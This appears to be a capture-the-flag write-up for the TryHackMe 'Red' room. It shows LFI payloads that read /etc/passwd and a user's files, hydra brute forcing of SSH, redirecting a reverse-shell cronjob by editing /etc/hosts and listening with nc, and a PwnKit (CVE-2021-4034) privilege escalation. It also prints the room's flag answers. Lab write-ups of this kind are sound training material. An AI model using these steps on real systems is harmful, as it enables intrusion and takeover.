# [Red](https://tryhackme.com/room/redisl33t)

> A classic battle for the ages.

## Scanning

scan the target

```
nmap -sS -sV -sC -T4 10.10.196.223
```

there are 2 open ports ssh and http

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/31d71fa4-4084-40c4-b899-d43d03f6dc3e)

## HTTP

check the webpage, you will see there is a parameter `?page=home.html`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ed12e81e-60ee-43af-a145-a537dcb206b0)

it appears for a Local File Inclusion (LFI) vulnerable

so i tried some payloads like `?page=../../../etc/passwd` or `?page=....//....//....//etc/passwd` are not work

for some research i found Exploiting Local File Inclusion (LFI) Using PHP Wrapper

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/49e4dbde-936b-4d4c-a2da-7bcaca159eee)

```
?page=php://filter/resource=/etc/passwd
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2cb33fc8-98c3-4f95-a64e-f4e572068c41)

we see that 2 users on the machine call red & blue

## Enumeration

i will use LFI Hunter to enummerate some interest files

```
git clone https://github.com/hadrian3689/lfi_hunter
cd lfi_hunter
python3 lfi_hunter.py -u 'http://10.10.196.223/index.php?page=' -l 'php://filter/resource=' -w unix.txt
```

it reveal a lot of information, but it found something interesting in blue's history

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/973f19c4-6d5f-4e3a-b63a-55712c4906bd)

it seem blue has create a hashcat rule to build a password list from a .reminder file

```
?page=php://filter/resource=/home/blue/.reminder
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/245f5887-0e6e-45ca-bbb5-627fda15a2d6)

so recreate the password list with the same command

```
echo 'sup3r_p@s$w0rd!' > pass.txt
hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3083eaae-c4e0-451d-9b5c-475ed9a6b94e)

## Exploitation

so, let's bruteforce the password with hydra

```
hydra -l blue -P passlist.txt ssh://10.10.196.223
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/adbdd4a4-6cd5-4fe6-b7ca-9e03701891e3)

ssh to blue

```
ssh blue@10.10.196.223
sup3r_p@s$w0rd!23
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5f72e1d7-98a1-44f0-8dd3-930c49991fb0)

| Flag | flag1 |
| --- | --- |
| Answer | THM{Is_thAt_all_y0u_can_d0_blU3} |

i have a message from red, and got kicked out from the machine and blue's password change

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f2d192e6-21ac-4ef6-b19c-01b71929e532)

try again

```
hydra -l blue -P passlist.txt ssh://10.10.196.223
# and ssh again with new password
ssh blue@10.10.196.223
```

there are a cronjob write annoying message, you can check it with `pspy` or just other simple way

```
ps aux
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8ef322df-2968-43a1-a121-f7cea16dff8b)

we see that it's a reverse shell command that is connecting to redrules.thm on port 9001 runs every minute

i decided to check the hosts file and see what is this domain

```
cat /etc/hosts
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/143dcbac-ba64-4a2e-9a55-f34a617f921f)

but we have read and write permission of it

```
echo '10.18.37.45 redrules.thm' >> /etc/hosts
```

```
nc -vlnp 9001
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/afbaecf5-a075-4aaf-9d90-f5941d2b4168)

| Flag | flag2 |
| --- | --- |
| Answer | THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S} |

## Privilege Escalation

so we got the shell, upgrade it

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
```

find suid bit

```
find / -perm -u=s -type f 2>/dev/null
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7b1607aa-afc3-4c73-a433-a41a6db38c95)

hmm, by some research i see it related to CVE-2021-4034

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d24d2f51-20ab-4429-93c6-d0d056b0c557)

however, we don't have gcc or make installed

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b7a70022-8205-47f7-a8ec-5f30480fdf55)

so find a exploit using python

```
git clone https://github.com/joeammond/CVE-2021-4034
cp CVE-2021-4034/CVE-2021-4034.py pwnkit.py
vi pwnkit.py
```

edit the location of pkexec on the script

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c3cac580-5df8-46bd-a472-97ce33a8731b)

```
python3 pwnkit.py
```

our final flag

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/10565c73-ca0c-439b-b0f5-74777d82c8da)

| Flag | flag3 |
| --- | --- |
| Answer | THM{Go0d_Gam3_Blu3_GG} |
